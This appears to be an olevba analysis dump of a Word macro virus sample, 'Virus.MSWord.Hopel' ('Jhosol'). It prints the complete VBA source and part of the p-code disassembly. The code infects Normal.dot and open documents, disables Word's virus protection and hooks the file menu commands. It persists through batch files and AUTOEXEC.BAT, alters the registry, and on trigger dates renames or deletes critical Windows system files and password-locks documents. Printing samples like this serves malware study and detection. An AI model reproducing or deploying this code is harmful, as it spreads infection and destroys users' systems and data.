olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hopel
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hopel - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jhosol.bas 
in file: ./Virus.MSWord.Hopel - OLE stream: 'Macros/VBA/Jhosol'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub RemoveMacro(xnt)
On Error Resume Next
WordBasic.DisableAutoMacros -1
Dim DocuName$
Dim I%, J%
For I = xnt.VBProject.VBComponents.Count To 1 Step -1
    DocuName = xnt.VBProject.VBComponents(I).Name
    If (DocuName <> "Jhosol") And _
        (DocuName <> "ThisDocument") Then
        Application.OrganizerDelete _
            Source:=xnt.FullName _
            , Name:=DocuName _
            , Object:=wdOrganizerObjectProjectItems
    End If
Next I
For Each openDoc In Documents
    With openDoc
        For J = openDoc.VBProject.VBComponents.Count To 1 Step -1
            DocuName = openDoc.VBProject.VBComponents(J).Name
            If (DocuName <> "Jhosol") And _
               (DocuName <> "ThisDocument") And _
               (DocuName <> "Reference to Normal") Then
                 Application.OrganizerDelete Source:=openDoc.FullName _
                 , Name:=DocuName _
                 , Object:=wdOrganizerObjectProjectItems
            End If
        Next J
    End With
Next openDoc
End Sub

Private Sub Jhosol()
On Error Resume Next
If shield2 = True Then
   Exit Sub
End If
Const akoa = "jhj"
Dim DocInf, NTInf As Boolean
Dim ad, nt As Object
Dim jhjCode As String
Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
DocInf = ad.CodeModule.Find(akoa, 1, 1, 10000, 10000)
NTInf = nt.CodeModule.Find(akoa, 1, 1, 10000, 10000)
Options.VirusProtection = False
If Date > #9/1/01# Then
   Call ChangeInfo
End If
If Date > #10/1/01# And shield <> True Then
   Call Manipulate
End If
nday = Day(Date)
If nday = 31 Then
   Kill "c:\windows\system\vnetx.vxd"
End If
'Siguroon una nga ang ubang kondisyon tinood sa dili pa ta mopadayon pagtakod sa uban
If (DocInf = True Xor NTInf = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
  'Patakodan ang NT
  If DocInf = True Then
     Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
     jhjCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
     NormalTemplate.VBProject.VBComponents.Add(1).Name = "Jhosol"
     Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
     ad.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
     Call AddStr(nt, jhjCode)
     NormalTemplate.Save
     If hasmarker() <> True Then
        Call CreateLoader
     End If
  End If
  'Patakodan ang ActiveDocument
  If NTInf = True Then
    Set nt = NormalTemplate.VBProject.VBComponents.Item(2)
    jhjCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ActiveDocument.VBProject.VBComponents.Add(1).Name = "Jhosol"
    Set ad = ActiveDocument.VBProject.VBComponents.Item(2)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    Call AddStr(ad, jhjCode)
    ActiveDocument.Save
  End If
End If
End Sub

Private Sub ChangeInfo()
    On Error Resume Next
    Application.UserName = "ALL MANKIND"
    Application.UserAddress = "DI MAKITA ST."
    Application.UserInitials = "XXX"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "ALL MANKIND"
        .Keywords = "MESS WITH THE BEST, DIE LIKE THE REST"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
End Sub

Private Sub Manipulate()
    Dim xp As String
    xp = "acidburn"
    On Error Resume Next
    nmth = Month(Date)
    nday = Day(Date)
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Mess with the best!"
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "-=- Jhosol -=-"
    If nmth = 10 And nday = 21 Then
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s1159") = "JHOSOL"
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s2359") = "JHOSOL"
    Else
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s1159") = "AM"
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "s2359") = "PM"
    End If

    If WeekDay(Date) = 4 And (getcode() = 23 Or getcode() = 6 Or getcode() = 18) Then
       Kill "c:\windows\system\epson9.drv"
       Name "c:\windows\system\netbeui.vxd" As "c:\windows\system\iuebten.vxd"
    End If
    If WeekDay(Date) = 5 And (getcode() = 25 Or getcode() = 28) Then
       Name "c:\windows\system\cm8330.drv" As "c:\windows\system\0338mc.drv"
       Name "c:\windows\system\cm8330.vxd" As "c:\windows\system\0338mc.vxd"
    End If
    If WeekDay(Date) = 7 And (getcode() = 27 Or getcode() = 13) Then
       Name "c:\windows\system\sis597m.drv" As "c:\windows\system\m795sis.drv"
       Name "c:\windows\system\sis597m.vxd" As "c:\windows\system\m795sis.vxd"
       Name "c:\windows\explorer.exe" As "c:\windows\rerolpxe.exe"
    End If
    If WeekDay(Date) = 1 And getcode() = 32 Then
       Name "c:\windows\system\dplay.dll" As "c:\windows\system\yalpd.dll"
       Name "c:\windows\system\dplayx.dll" As "c:\windows\system\xyalpd.dll"
    End If
    If WeekDay(Date) = nday Then
       Name "c:\windows\system\vmm32.vxd" As "c:\windows\system\23mmv.vxd"
    End If
    If nday = nmth And (getcode() = 8 Or getcode() = 14 Or getcode() = 22) Then
       Name "c:\windows\system\sage.dll" As "c:\windows\system\egas.dll"
    End If
    If WeekDay(Date) = nmth And getcode() = 12 Then
       Name "c:\windows\system\comdlg32.dll" As "c:\windows\system\23gldmoc.dll"
    End If
    If WeekDay(Date) = nmth And WeekDay(Date) = nday Then
       Name "c:\windows\command\command.com" As "c:\windows\command\dnammoc.com"
       Name "c:\command.com" As "c:\dnammoc.com"
    End If
    If WeekDay(Date) = 6 And getcode() = 16 Then
       System.PrivateProfileString("", "HKEY_USERS\.Default\Control Panel\International", "sDecimal") = "$"
       Name "c:\windows\system\mouse.drv" As "c:\windows\system\esuom.drv"
    End If
    If nmth = 12 And nday = 10 Then
       System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\MS-DOSOptions\DOSSettings", "Config.Sys") = "DOS=SINGLE"
    End If
    If (getcode() = 5 Or getcode() = 15 Or getcode = 10 Or getcode = 29) _
        And WeekDay(Date) = 6 Then
        ActiveDocument.Password = xp
    End If
    If (getcode() = 10 Or getcode() = 30) And WeekDay(Date) = 3 Then
       With Options
        .PrintDraft = True
        .PrintFieldCodes = True
        .PrintHiddenText = True
        .PrintDrawingObjects = False
       End With
    End If
    If WeekDay(Date) = 2 And getcode() = 1 Then
       With ActiveDocument.PageSetup
        .Orientation = wdOrientLandscape
       End With
    End If
    If WeekDay(Date) = 3 And (getcode() = 3 Or getcode() = 4) Then
       With ActiveDocument.PageSetup
        .TopMargin = InchesToPoints(5.25)
       End With
    End If
    If WeekDay(Date) = 4 And getcode() = 5 Then
       With ActiveDocument.PageSetup
        .BottomMargin = InchesToPoints(5.25)
       End With
    End If
    If WeekDay(Date) = 5 And getcode() = 6 Then
       With ActiveDocument.PageSetup
        .LeftMargin = InchesToPoints(4)
       End With
    End If
    If WeekDay(Date) = 6 And getcode() = 7 Then
       With ActiveDocument.PageSetup
        .RightMargin = InchesToPoints(5)
       End With
    End If
    If WeekDay(Date) = 7 And getcode() = 8 Then
       With ActiveDocument.PageSetup
        .PageWidth = InchesToPoints(13)
       End With
    End If
    If WeekDay(Date) = 2 And getcode() = 9 Then
       With ActiveDocument.PageSetup
        .PageHeight = InchesToPoints(10.5)
    End With
    End If
    If WeekDay(Date) = 3 And getcode() = 26 Then
       With ActiveWindow
        .DisplayHorizontalScrollBar = False
        .DisplayVerticalScrollBar = False
        .DisplayVerticalRuler = False
       End With
    End If
    If WeekDay(Date) = 4 And getcode() = 11 Then
       CommandBars("Formatting").Visible = False
       CommandBars("Standard").Visible = False
    End If
    If WeekDay(Date) = 5 And getcode() = 12 Then
       With Options
        .PrintReverse = True
       End With
    End If
    If WeekDay(Date) = 5 And getcode() = 13 Then
       With Options
        .PrintBackground = False
       End With
    End If
    If WeekDay(Date) = 6 And getcode() = 14 Then
       CommandBars("Formatting").Controls(8).Delete
    End If
    If WeekDay(Date) = 7 And getcode() = 15 Then
       CommandBars("Formatting").Controls(6).Delete
    End If
    If WeekDay(Date) = 1 And getcode() = 27 Then
       CommandBars("Formatting").Controls(4).Delete
    End If
    If WeekDay(Date) = 2 And (getcode() = 37 Or getcode() = 48 Or getcode() = 50) Then
       Selection.WholeStory
       Selection.Range.Case = wdToggleCase
       Selection.MoveRight Unit:=wdCharacter, Count:=1
    End If
    If (getcode() = 19 Or getcode() = 29 Or getcode = 49 Or getcode = 29) _
        And WeekDay(Date) = 3 Then
        ActiveDocument.Protect Password:="lasiov", NoReset:=False, Type:=wdAllowOnlyRevisions
    End If
    If (getcode() = 47 Or getcode() = 51 Or getcode = 49 Or getcode = 29) _
        And WeekDay(Date) = 4 Then
       With ActiveDocument.PageSetup.TextColumns
        .SetCount NumColumns:=2
       End With
    End If
    If WeekDay(Date) = 100 And (getcode() = 48 Or getcode() = 46 Or getcode() = 43) Then
       Selection.WholeStory
       Selection.Range.Case = wdUpperCase
       Selection.MoveRight Unit:=wdCharacter, Count:=1
    End If
    AutoCorrect.Entries.Add Name:="STI", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="AMA", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="UB", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="University of Bohol", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="System Technology Institute", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="Bohol Institute of Technology", Value:="Divine Word College"
    AutoCorrect.Entries.Add Name:="BIT", Value:="DWC-T"
    AutoCorrect.Entries.Add Name:="CVSCAFT", Value:="DWC-T"
End Sub

Sub FileOpen()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    Dialogs(wdDialogFileOpen).Show
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
End Sub

Sub FileClose()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    ActiveDocument.Close
End Sub

Sub AddStr(ByVal obj As Object, str As String)
On Error Resume Next
obj.CodeModule.AddFromString str
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
    On Error Resume Next
    Call RemoveMacro(NormalTemplate)
    Call Jhosol
    ActiveDocument.Save
End Sub

Private Function shield()
  On Error Resume Next
  myshield$ = ""
  myshield$ = Dir("c:\windows\system\vnetx.vxd")
  If myshield$ = "vnetx.vxd" Then
     shield = True
     Exit Function
  End If
End Function

Private Function shield2()
  On Error Resume Next
  myshield$ = ""
  myshield$ = Dir("c:\windows\system\christx.vxd")
  If myshield$ = "christx.vxd" Then
     shield2 = True
     Exit Function
  End If
End Function
Sub ToolsMacro()
    
End Sub

Sub ViewVBCode()

End Sub

Sub FileTemplates()

End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
End Sub

Sub HelpAbout()
    On Error Resume Next
    X = MsgBox("JHOSOL SOFTWARE SOLUTIONS" & Chr(13) & Chr(13) & _
    "(E-mail: jhosol@yahoo.com)", vbOKOnly + vbExclamation, "Hacker's Information")
End Sub

Sub MyMacroOpen()
    On Error Resume Next
    vp = "102173"
    If InputBox("Enter password", "View Jhosol's Viral Code") = vp Then Application.ShowVisualBasicEditor = True
End Sub

Private Sub AddKey()
  On Error Resume Next
  CustomizationContext = NormalTemplate
  KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyControl, wdKeyAlt, wdKeyJ), _
    KeyCategory:=wdKeyCategoryMacro, Command:="MyMacroOpen"
End Sub

Sub AutoOpen()
  On Error Resume Next
  Call RemoveMacro(NormalTemplate)
  Call Jhosol
End Sub

Sub AutoExec()
  On Error Resume Next
  WordBasic.DisableAutoMacros -1
  Call AddKey
  nmth = Month(Date)
  nday = Day(Date)
  If ((nmth = 12) And (nday = 25)) Or ((nmth = 1) And (nday = 1)) Then
     X = MsgBox("MAAYONG PASKO UG MALIPAYONG BAG-ONG TUIG" & Chr(13) & _
     "KANINYONG TANAN" & Chr(13) & Chr(13) & _
     "Gikan ni: JHOSOL", vbOKOnly + vbExclamation, "Hacker's Greeting")
  End If
  If (nmth = 2) And (nday = 14) Then
     X = MsgBox("HAPPY VALENTINES DAY" & Chr(13) & Chr(13) & _
     "From: JHOSOL", vbOKOnly + vbExclamation, "Hacker's Greeting")
  End If
  If hasmarker() = False Then
     Call CreateLoader
  End If
End Sub

Sub CreateLoader()
On Error Resume Next
scode = Chr(255)
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:="C:\WINDOWS\COMMAND\nt.txt", AddToRecentFiles:=False
    .Close SaveChanges:=wdDoNotSaveChanges
End With

scode = Chr$(255)
batchfle$ = "C:\WINDOWS\COMMAND\t.bat"
fNmbr = FreeFile
Open batchfle$ For Append Access Write As #fNmbr
    Print #fNmbr, "@ECHO OFF"
    Print #fNmbr, "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt -H -R > NUL"
    Print #fNmbr, "COPY C:\WINDOWS\COMMAND\nt.txt C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
    Print #fNmbr, "if exist C:\WINDOWS\COMMAND\nt.txt ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
    Print #fNmbr, "if exist c:\windows\command\tmp.bat del c:\windows\command\tmp.bat > nul"
    Print #fNmbr, "if exist c:\windows\command\t.bat del c:\windows\command\t.bat > nul"
Close #fNmbr

tmpfle$ = "C:\windows\command\tmp.bat"
fNmbr = FreeFile
Open tmpfle$ For Append Access Write As #fNmbr
Print #fNmbr, "rename c:\windows\command\t.bat " & scode & ".bat > nul"
Print #fNmbr, "ATTRIB C:\WINDOWS\COMMAND\nt.txt +H +R > NUL"
Close #fNmbr
Shell "command.com /c c:\windows\command\tmp.bat", vbHide
autofle$ = "C:\AUTOEXEC.BAT"
fNmbr = FreeFile
SetAttr autofle$, vbNormal
Open autofle$ For Append Access Write As #fNmbr
Print #fNmbr, scode
Close #fNmbr
End Sub

Function hasmarker()
On Error Resume Next
If Dir("c:\autoexec.bat") = "" Then
   Call mkautof
End If
autofle$ = "C:\AUTOEXEC.BAT"
hNmbr = FreeFile
Dim InputData, ShowLine
Open autofle$ For Input As #hNmbr
fMarker = Chr(255)
hasmarker = False
Do While Not EOF(1)
    Line Input #hNmbr, InputData
    If InputData = fMarker Then hasmarker = True
Loop
Close #hNmbr
End Function

Sub mkautof()
autofle$ = "C:\Autoexec.bat"
hNmbr = FreeFile
Open autofle$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "PROMPT $P$G"
    Print #hNmbr, "SET PATH=C:\WINDOWS;C:\WINDOWS\COMMAND"
Close #hNmbr
End Sub

Function getcode()
    Select Case Timer
        Case 28802 To 29700
            getcode = 1
        Case 29701 To 30601
            getcode = 2
        Case 30602 To 31501
            getcode = 3
        Case 31502 To 32400
            getcode = 4
        Case 32401 To 33300
            getcode = 5
        Case 33301 To 34200
            getcode = 6
        Case 34201 To 35100
            getcode = 7
        Case 35101 To 36000
            getcode = 8
        Case 36001 To 36900
            getcode = 9
        Case 36901 To 37800
            getcode = 10
        Case 37801 To 38700
            getcode = 11
        Case 38701 To 39600
            getcode = 12
        Case 39601 To 40500
            getcode = 13
        Case 40501 To 41400
            getcode = 14
        Case 41401 To 42300
            getcode = 15
        Case 42301 To 43200
            getcode = 16
        Case 43201 To 44100
            getcode = 17
        Case 44101 To 45000
            getcode = 18
        Case 45001 To 45900
            getcode = 19
        Case 45901 To 46800
            getcode = 20
        Case 46801 To 47700
            getcode = 21
        Case 47701 To 48600
            getcode = 22
        Case 48601 To 49500
            getcode = 23
        Case 49501 To 50400
            getcode = 24
        Case 50401 To 51300
            getcode = 25
        Case 51301 To 52200
            getcode = 26
        Case 52201 To 53100
            getcode = 27
        Case 53101 To 54000
            getcode = 28
        Case 54001 To 54900
            getcode = 29
        Case 54901 To 55800
            getcode = 30
        Case 55801 To 56700
            getcode = 31
        Case 56701 To 57600
            getcode = 32
        Case 57601 To 58500
            getcode = 33
        Case 58501 To 59400
            getcode = 34
        Case 59401 To 60300
            getcode = 35
        Case 60301 To 61200
            getcode = 36
        Case 61201 To 62100
            getcode = 37
        Case 62101 To 63000
            getcode = 38
        Case 63001 To 63901
            getcode = 39
        Case 63902 To 64800
            getcode = 40
        Case 64801 To 65700
            getcode = 41
        Case 65701 To 66600
            getcode = 42
        Case 66601 To 67500
            getcode = 43
        Case 67501 To 68400
            getcode = 44
        Case 68401 To 69300
            getcode = 45
        Case 69301 To 70200
            getcode = 46
        Case 70201 To 72000
            getcode = 47
        Case 72001 To 75600
            getcode = 48
        Case 75601 To 79201
            getcode = 49
        Case 79202 To 82800
            getcode = 50
        Case 82801 To 86340
            getcode = 51
        Case 86341 To 99999
            getcode = 52
        Case Else
            getcode = 100
    End Select
End Function










































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Hopel
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1282 bytes
' Macros/VBA/Jhosol - 35738 bytes
' Line #0:
' 	FuncDefn (Private Sub RemoveMacro(xnt))
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	Dim 
' 	VarDefn DocuName
' Line #4:
' 	Dim 
' 	VarDefn I
' 	VarDefn J
' Line #5:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld xnt 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #6:
' 	Ld I 
' 	Ld xnt 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocuName 
' Line #7:
' 	LineCont 0x0004 07 00 08 00
' 	Ld DocuName 
' 	LitStr 0x0006 "Jhosol"
' 	Ne 
' 	Paren 
' 	Ld DocuName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #8:
' 	LineCont 0x000C 03 00 0C 00 08 00 0C 00 0C 00 0C 00
' 	Ld xnt 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocuName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #12:
' 	StartWithExpr 
' 	Ld openDoc 
' 	With 
' Line #13:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #14:
' 	Ld J 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocuName 
' Line #15:
' 	LineCont 0x0008 07 00 0F 00 0D 00 0F 00
' 	Ld DocuName 
' 	LitStr 0x0006 "Jhosol"
' 	Ne 
' 	Paren 
' 	Ld DocuName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld DocuName 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #16:
' 	LineCont 0x0008 08 00 11 00 0C 00 11 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocuName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndWith 
' Line #20:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' 	FuncDefn (Private Sub Jhosol())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	Ld shield2 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	ExitSub 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Dim (Const) 
' 	LitStr 0x0003 "jhj"
' 	VarDefn akoa
' Line #29:
' 	Dim 
' 	VarDefn DocInf
' 	VarDefn NTInf (As Boolean)
' Line #30:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #31:
' 	Dim 
' 	VarDefn jhjCode (As String)
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #34:
' 	Ld akoa 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocInf 
' Line #35:
' 	Ld akoa 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTInf 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #37:
' 	Ld Date 
' 	LitDate 0x0000 0x0000 0x21E0 0x40E2 
' 	Gt 
' 	IfBlock 
' Line #38:
' 	ArgsCall (Call) ChangeInfo 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld Date 
' 	LitDate 0x0000 0x0000 0x25A0 0x40E2 
' 	Gt 
' 	Ld shield 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #41:
' 	ArgsCall (Call) Manipulate 0x0000 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St nday 
' Line #44:
' 	Ld nday 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001B "c:\windows\system\vnetx.vxd"
' 	ArgsCall Kill 0x0001 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	QuoteRem 0x0000 0x0054 "Siguroon una nga ang ubang kondisyon tinood sa dili pa ta mopadayon pagtakod sa uban"
' Line #48:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NTInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' 	QuoteRem 0x0002 0x0010 "Patakodan ang NT"
' Line #50:
' 	Ld DocInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St jhjCode 
' Line #53:
' 	LitStr 0x0006 "Jhosol"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #54:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #56:
' 	Ld nt 
' 	Ld jhjCode 
' 	ArgsCall (Call) AddStr 0x0002 
' Line #57:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #58:
' 	ArgsLd hasmarker 0x0000 
' 	LitVarSpecial (True)
' 	Ne 
' 	IfBlock 
' Line #59:
' 	ArgsCall (Call) CreateLoader 0x0000 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	QuoteRem 0x0002 0x001C "Patakodan ang ActiveDocument"
' Line #63:
' 	Ld NTInf 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St jhjCode 
' Line #66:
' 	LitStr 0x0006 "Jhosol"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	MemSt New 
' Line #67:
' 	SetStmt 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #69:
' 	Ld ad 
' 	Ld jhjCode 
' 	ArgsCall (Call) AddStr 0x0002 
' Line #70:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndSub 
' Line #74:
' Line #75:
' 	FuncDefn (Private Sub ChangeInfo())
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitStr 0x000B "ALL MANKIND"
' 	Ld Application 
' 	MemSt UserName 
' Line #78:
' 	LitStr 0x000D "DI MAKITA ST."
' 	Ld Application 
' 	MemSt UserAddress 
' Line #79:
' 	LitStr 0x0003 "XXX"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #80:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #81:
' 	LitStr 0x000B "ALL MANKIND"
' 	MemStWith Author 
' Line #82:
' 	LitStr 0x0025 "MESS WITH THE BEST, DIE LIKE THE REST"
' 	MemStWith Keywords 
' Line #83:
' 	ArgsMemCallWith Execute 0x0000 
' Line #84:
' 	EndWith 
' Line #85:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #87:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #88:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #89:
' 	EndWith 
' Line #90:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #91:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #92:
' 	EndWith 
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub Manipulate())
' Line #96:
' 	Dim 
' 	VarDefn xp (As String)
' Line #97:
' 	LitStr 0x0008 "acidburn"
